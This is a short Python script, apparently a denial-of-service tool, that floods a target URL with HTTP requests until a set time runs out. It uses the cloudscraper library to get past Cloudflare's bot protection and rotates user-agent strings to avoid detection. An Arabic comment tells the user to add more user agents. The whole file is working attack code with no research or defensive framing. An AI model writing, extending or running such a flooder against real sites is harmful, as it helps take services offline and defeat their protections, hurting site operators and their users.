import cloudscraper
import random
import time

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    # أضف مزيدًا من user agents متنوعة
]

def http_flood_bypass_cf(target_url, duration):
    scraper = cloudscraper.create_scraper()
    timeout = time.time() + duration

    while time.time() < timeout:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive"
            }
            response = scraper.get(target_url, headers=headers, timeout=10)
            print(f"[HTTP CF] Request sent, status: {response.status_code}")
        except Exception as e:
            print(f"[HTTP CF] Error: {e}")
